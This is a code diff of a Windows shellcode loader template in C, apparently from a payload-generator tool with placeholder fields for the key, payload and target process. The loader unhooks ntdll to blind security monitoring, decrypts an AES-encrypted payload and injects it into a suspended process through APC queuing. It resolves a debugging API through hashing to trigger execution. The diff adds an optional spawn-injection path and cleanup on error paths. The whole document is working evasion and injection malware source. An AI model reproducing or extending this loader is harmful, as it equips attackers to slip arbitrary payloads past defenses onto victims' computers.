@@ -7,95 +7,111 @@
 
 #define TARGET_PROCESS "#-TARGET_PROCESS-#"
 
-
 uint8_t aes_k[16] = { #-KEY_VALUE-# };
 uint8_t aes_i[16] = { #-IV_VALUE-# };
 
-
 unsigned char payload[] = {
-	#-PAYLOAD_VALUE-#
+        #-PAYLOAD_VALUE-#
 };
+
+#ifdef USE_SPAWN
+BOOL SpawnAndInject(PVOID pPayload, SIZE_T sPayload);
+#endif
 
 int main() {
 
-	SIZE_T		sEncPayload			= sizeof(payload);
-	PVOID		pClearText			= NULL,
-				pProcess			= NULL;
-	DWORD		dwSizeOfClearText	= 0,
-				dwOldProtect		= 0,
-				dwProcessId			= 0;
-	AES_CTX		ctx;
+        SIZE_T          sEncPayload                     = sizeof(payload);
+        PVOID           pClearText                      = NULL,
+                                pProcess                        = NULL;
+        DWORD           dwSizeOfClearText       = 0,
+                                dwOldProtect            = 0,
+                                dwProcessId                     = 0;
+        AES_CTX         ctx;
 
-	HANDLE		hThread				= NULL,
-				hProcess			= NULL;
+        HANDLE          hThread                         = NULL,
+                                hProcess                        = NULL;
 
-	NTSTATUS	STATUS				= 0x00;
+        NTSTATUS        STATUS                          = 0x00;
 
-	
-	//printf("[+] Un-hooking Ntdll \n");
-	LPVOID nt = MapNtdll();
-	if (!nt) 
-		return -1;
 
-	if (!Unhook(nt)) 
-		return -1;
-	
-	Sleep(500);
+        //printf("[+] Un-hooking Ntdll \n");
+        LPVOID nt = MapNtdll();
+        if (!nt) 
+                return -1;
 
-	//printf("[+] PID: %d\n", GetCurrentProcessId());
-	//printf("[+] Got the content at position: 0x%p with size of %zu\n", &payload, sEncPayload);
+        if (!Unhook(nt)) 
+                return -1;
 
-	// Decryption routine
-	//printf("[i] Starting the decryption...\n");
-	
-	Sleep(500);
-	// Allocating memory to store the decrypted payload inside of pClearText
-	pClearText = (PBYTE)malloc(sEncPayload);
-	AES_DecryptInit(&ctx, aes_k, aes_i);
-	AES_DecryptBuffer(&ctx, &payload, pClearText, sEncPayload);
+        Sleep(500);
 
-	//printf("\t[+] Payload decrypted at postion: 0x%p with size of %zu\n", pClearText, sEncPayload);
+        //printf("[+] PID: %d\n", GetCurrentProcessId());
+        //printf("[+] Got the content at position: 0x%p with size of %zu\n", &payload, sEncPayload);
 
-	Sleep(1500);
-	//printf("[i] Creating suspended process..\n");
-	// Creating a suspeneded process now
-	if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
+        // Decryption routine
+        //printf("[i] Starting the decryption...\n");
 
-		//printf("[-] Failed to create suspended process!\n");
-		return -1;
-	}
-	//printf("[+] Process created with PID: %d\n", dwProcessId);
+        Sleep(500);
+        // Allocating memory to store the decrypted payload inside of pClearText
+        pClearText = (PBYTE)malloc(sEncPayload);
+        AES_DecryptInit(&ctx, aes_k, aes_i);
+        AES_DecryptBuffer(&ctx, &payload, pClearText, sEncPayload);
 
-	Sleep(2500);
-	//printf("[i] Injecting the shellcode into the process..\n");
-	// Doing the APC Injection
-	if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess)) {
+        //printf("\t[+] Payload decrypted at postion: 0x%p with size of %zu\n", pClearText, sEncPayload);
 
-		return -1;
-	}
+        Sleep(1500);
 
-	Sleep(1500);
-	//printf("[i] Running the shellcode via NtQueueApcThread..\n");
-	// Running the thread via QueueAPCThread
-	if ((STATUS = NTQAT(hThread, pProcess, NULL, NULL, NULL)) != 0) {
+#ifdef USE_SPAWN
+        // --- SPAWN INJECTION ---
+        if (!SpawnAndInject(pClearText, sEncPayload)) {
+                //printf("[-] Spawn injection failed!\n");
+                free(pClearText);
+                return -1;
+        }
+        //printf("[+] Spawn injection successful!\n");
+#else
+        // --- ORIGINAL APC INJECTION ---
+        //printf("[i] Creating suspended process..\n");
+        // Creating a suspeneded process now
+        if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
 
-		//printf("[-] NtQueueApcThrad failed!\n");
-		return -1;
-	}
-	
-	// API Hashing
-	cDAPS cDAPSu = (cDAPS) GetProcAddressH(GetModuleHandleH(#-KERNELBASE_VALUE-#), #-DAPS_VALUE-#);
+                //printf("[-] Failed to create suspended process!\n");
+                free(pClearText);
+                return -1;
+        }
+        //printf("[+] Process created with PID: %d\n", dwProcessId);
 
-	//printf("[i] Position of DAPsu: 0x%p\n", cDAPSu);
+        Sleep(2500);
+        //printf("[i] Injecting the shellcode into the process..\n");
+        // Doing the APC Injection
+        if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess)) {
+                free(pClearText);
+                return -1;
+        }
 
-	Sleep(1000);
-	// Stopping the debugging of the process, which launches the payload
-	cDAPSu(dwProcessId);
-	//printf("[+] Payload executed!\n");
-	
-	CloseHandle(hThread);
-	CloseHandle(hProcess);
-	free(pClearText);
+        Sleep(1500);
+        //printf("[i] Running the shellcode via NtQueueApcThread..\n");
+        // Running the thread via QueueAPCThread
+        if ((STATUS = NTQAT(hThread, pProcess, NULL, NULL, NULL)) != 0) {
 
-	return 0;
+                //printf("[-] NtQueueApcThrad failed!\n");
+                free(pClearText);
+                return -1;
+        }
+
+        // API Hashing
+        cDAPS cDAPSu = (cDAPS) GetProcAddressH(GetModuleHandleH(#-KERNELBASE_VALUE-#), #-DAPS_VALUE-#);
+
+        //printf("[i] Position of DAPsu: 0x%p\n", cDAPSu);
+
+        Sleep(1000);
+        // Stopping the debugging of the process, which launches the payload
+        cDAPSu(dwProcessId);
+        //printf("[+] Payload executed!\n");
+
+        CloseHandle(hThread);
+        CloseHandle(hProcess);
+#endif
+
+        free(pClearText);
+        return 0;
 }
